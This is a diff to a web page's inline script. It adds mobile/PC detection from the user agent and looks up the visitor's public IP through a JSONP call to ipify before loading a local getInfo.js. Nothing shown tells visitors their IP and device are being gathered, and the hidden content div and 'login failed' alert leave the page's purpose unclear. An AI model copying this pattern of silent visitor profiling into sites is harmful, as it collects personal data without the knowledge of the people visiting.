@@ -45,9 +45,35 @@
     <div id="content" style="display: none;"></div>
   </body>
 </html>
-<!-- <script src="./jquery-1.9.1.min.js"></script> -->
 <script src="./utils.js"></script>
 <script>
+  window.platform = ''
+  function browserRedirect() {
+    var sUserAgent = navigator.userAgent.toLowerCase()
+    var bIsIpad = sUserAgent.match(/ipad/i) == 'ipad'
+    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == 'iphone os'
+    var bIsMidp = sUserAgent.match(/midp/i) == 'midp'
+    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == 'rv:1.2.3.4'
+    var bIsUc = sUserAgent.match(/ucweb/i) == 'ucweb'
+    var bIsAndroid = sUserAgent.match(/android/i) == 'android'
+    var bIsCE = sUserAgent.match(/windows ce/i) == 'windows ce'
+    var bIsWM = sUserAgent.match(/windows mobile/i) == 'windows mobile'
+    if (
+      bIsIpad ||
+      bIsIphoneOs ||
+      bIsMidp ||
+      bIsUc7 ||
+      bIsUc ||
+      bIsAndroid ||
+      bIsCE ||
+      bIsWM
+    ) {
+      window.platform = '移动端'
+    } else {
+      window.platform = 'PC端'
+    }
+  }
+  browserRedirect()
   let time = new Date()
   let year = time.getFullYear()
   let month = time.getMonth() + 1
@@ -84,9 +110,23 @@
     alert('登陆失败')
   }
 
-  setTimeout(() => {
-    fun()
-  }, 5000)
-  postData()
+  window.userIp = null
+  function getUserIp() {
+    return new Promise((resolve) => {
+      window.getIp = function (res) {
+        window.userIp = res.ip
+        resolve(res.ip)
+      }
+      let getIpScript = document.createElement('script')
+      getIpScript.src = 'https://api.ipify.org/?format=jsonp&callback=getIp'
+      document.body.appendChild(getIpScript)
+    })
+  }
+  async function createScript() {
+    window.userIp = await getUserIp()
+    let getIpScript = document.createElement('script')
+    getIpScript.src = './getInfo.js'
+    document.body.appendChild(getIpScript)
+  }
+  createScript()
 </script>
-<script src="./getInfo.js"></script>
